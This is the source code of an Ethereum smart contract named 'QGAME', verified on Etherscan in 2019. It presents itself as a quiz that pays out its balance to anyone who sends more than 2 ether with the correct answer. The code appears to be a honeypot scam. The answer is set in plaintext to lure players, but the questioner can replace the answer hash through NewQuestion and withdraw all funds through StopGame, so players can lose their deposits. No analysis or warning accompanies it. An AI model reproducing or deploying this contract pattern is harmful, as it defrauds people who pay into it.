/**

 *Submitted for verification at Etherscan.io on 2019-03-09

*/



pragma solidity ^0.4.25;



contract QGAME

{



    function Try(string _response) external payable {

        require(msg.sender == tx.origin);



        if(responseHash == keccak256(_response) && msg.value > 2 ether)

        {

            msg.sender.transfer(this.balance);

        }

    }



    string public question;



    address questionSender;



    bytes32 responseHash;



    bytes32 questionerPin = 0x5c18911b2f0401b04458b5166f91356c9a1235a8d50ee6000a30db9950b7aaf9;



    function Activate(bytes32 _questionerPin, string _question, string _response) public payable {

        if(keccak256(_questionerPin)==questionerPin) 

        {

            responseHash = keccak256(_response);

            question = _question;

            questionSender = msg.sender;

            questionerPin = 0x0;

        }

    }



    function StopGame() public payable {

        require(msg.sender==questionSender);

        msg.sender.transfer(this.balance);

    }



    function NewQuestion(string _question, bytes32 _responseHash) public payable {

        if(msg.sender==questionSender){

            question = _question;

            responseHash = _responseHash;

        }

    }



    function newQuestioner(address newAddress) public {

        if(msg.sender==questionSender)questionSender = newAddress;

    }



    function() public payable{}

}